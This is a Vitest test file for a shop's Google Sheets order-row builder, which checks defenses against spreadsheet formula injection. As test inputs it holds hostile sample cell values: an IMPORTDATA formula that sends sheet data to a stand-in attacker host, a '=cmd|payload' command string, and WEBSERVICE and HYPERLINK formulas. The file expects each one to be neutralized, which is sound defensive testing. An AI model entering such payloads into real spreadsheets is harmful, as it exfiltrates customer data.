import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { buildSheetRow, sanitizeCell, type OrderRowInput } from "@/lib/sheets";

// Short-circuit the service-account JWT so the test exercises only the append
// request shape, not the credential flow. Mirrors sheets-read.test.ts.
vi.mock("google-auth-library", () => {
  class FakeJWT {
    constructor(_opts: unknown) {}
    async getAccessToken() {
      return { token: "fake-token" };
    }
  }
  return { JWT: FakeJWT };
});

const base: OrderRowInput = {
  orderNumber: "NAG-20260521-A7K1",
  timestampManila: "2026-05-21 14:30:00",
  name: "Juan",
  phone: "+639171234567",
  region: "NCR (Metro Manila)",
  province: "Metro Manila",
  city: "Quezon City",
  barangay: "Commonwealth",
  street: "123 Main St",
  landmark: "Near plaza",
  items: [
    { name: "Bio Plant Booster", qty: 2, priceCentavos: 25000 },
    { name: "Bio Enzyme", qty: 1, priceCentavos: 15000 },
  ],
  subtotalCentavos: 65000,
  shipping: { showFee: true, shippingCentavos: 12000, free: false },
  notes: "Leave at gate",
};

describe("buildSheetRow", () => {
  it("produces 17 columns in spec order", () => {
    const row = buildSheetRow(base);
    expect(row).toHaveLength(17);
    expect(row[0]).toBe("NAG-20260521-A7K1");
    expect(row[1]).toBe("2026-05-21 14:30:00");
    expect(row[10]).toBe("Bio Plant Booster ×2 @₱250; Bio Enzyme ×1 @₱150");
    expect(row[11]).toBe("₱650");
    expect(row[12]).toBe("₱120");
    expect(row[14]).toBe("NEW");
    expect(row[15]).toBe(""); // J&T tracking blank
    expect(row[16]).toBe(""); // staff notes blank
  });
  it("writes 'Confirmed on call' when shipping is not shown", () => {
    const row = buildSheetRow({ ...base, shipping: { showFee: false, shippingCentavos: 0, free: false } });
    expect(row[12]).toBe("Confirmed on call");
  });
  it("writes FREE in the shipping column when shipping.free is true", () => {
    const row = buildSheetRow({ ...base, shipping: { showFee: false, shippingCentavos: 0, free: true } });
    expect(row[12]).toBe("FREE");
  });

  it("neutralizes formula-injection in buyer-controlled cells with a leading apostrophe", () => {
    const row = buildSheetRow({
      ...base,
      name: '=IMPORTDATA("https://attacker/?d="&A:Q)',
      province: "+639-evil",
      city: "-2 City",
      barangay: "@SUM(A1)",
      street: "\t=cmd|payload",
      landmark: "\r=HYPERLINK()",
      notes: "=WEBSERVICE()",
    });
    expect(row[2]).toBe('\'=IMPORTDATA("https://attacker/?d="&A:Q)'); // Name
    expect(row[5]).toBe("'+639-evil"); // Province
    expect(row[6]).toBe("'-2 City"); // City
    expect(row[7]).toBe("'@SUM(A1)"); // Barangay
    expect(row[8]).toBe("'\t=cmd|payload"); // Street (leading tab)
    expect(row[9]).toBe("'\r=HYPERLINK()"); // Landmark (leading CR)
    expect(row[13]).toBe("'=WEBSERVICE()"); // Notes
  });

  it("leaves benign buyer text and server-generated cells untouched", () => {
    const row = buildSheetRow(base);
    expect(row[2]).toBe("Juan"); // Name
    expect(row[5]).toBe("Metro Manila"); // Province
    expect(row[8]).toBe("123 Main St"); // Street
    expect(row[9]).toBe("Near plaza"); // Landmark
    expect(row[13]).toBe("Leave at gate"); // Notes
    expect(row[0]).toBe("NAG-20260521-A7K1"); // Order# (server-generated)
  });

  it("apostrophe-prefixes the normalized phone so CSV/XLSX export keeps it as text", () => {
    // The server normalizes phones to "+639…"; the leading "+" is a formula
    // trigger, so without sanitizing, Excel/LibreOffice coerce "+639171234567"
    // into the number 6.39171E+11 on export and corrupt the COD-critical field.
    const row = buildSheetRow(base);
    expect(row[3]).toBe("'+639171234567");
  });
});

describe("sanitizeCell", () => {
  it.each(["=", "+", "-", "@", "\t", "\r", "\n"])(
    "prefixes an apostrophe when the value starts with %j",
    (ch) => {
      expect(sanitizeCell(`${ch}danger`)).toBe(`'${ch}danger`);
    }
  );
  it("passes benign values through unchanged", () => {
    expect(sanitizeCell("Juan dela Cruz")).toBe("Juan dela Cruz");
    expect(sanitizeCell("123 Rizal St.")).toBe("123 Rizal St.");
    expect(sanitizeCell("")).toBe("");
    expect(sanitizeCell("price is 5-10 pesos")).toBe("price is 5-10 pesos"); // trigger char not leading
  });
});

describe("appendOrderRow — formula/CSV injection guard", () => {
  beforeEach(() => {
    vi.stubEnv("GOOGLE_SHEET_ID", "sheet-id-stub");
    vi.stubEnv("GOOGLE_SERVICE_ACCOUNT_EMAIL", "stub@example.com");
    vi.stubEnv("GOOGLE_PRIVATE_KEY", "stub-key");
  });

  afterEach(() => {
    vi.unstubAllEnvs();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it("appends with valueInputOption=RAW so buyer text is never evaluated as a formula", async () => {
    const fetchMock = vi.fn<(url: string, init?: RequestInit) => Promise<Response>>(
      async () =>
        new Response(JSON.stringify({ updates: { updatedRows: 1 } }), {
          status: 200,
          headers: { "content-type": "application/json" },
        })
    );
    vi.stubGlobal("fetch", fetchMock);

    const { appendOrderRow } = await import("@/lib/sheets");
    // A name field carrying the IMPORTDATA exfil payload from the threat model.
    const row = buildSheetRow({
      ...base,
      name: '=IMPORTDATA("https://attacker/?d="&A:Q)',
    });
    await appendOrderRow(row);

    expect(fetchMock).toHaveBeenCalledTimes(1);
    const url = fetchMock.mock.calls[0][0];
    // The injection-prone mode must be gone and stay gone.
    expect(url).toContain("valueInputOption=RAW");
    expect(url).not.toContain("USER_ENTERED");
    // Defense-in-depth: buildSheetRow neutralizes the payload with a leading
    // apostrophe BEFORE append, so the exported CSV/XLSX can never re-arm it.
    const body = JSON.parse((fetchMock.mock.calls[0][1] as RequestInit).body as string);
    expect(body.values[0][2]).toBe('\'=IMPORTDATA("https://attacker/?d="&A:Q)');
  });
});
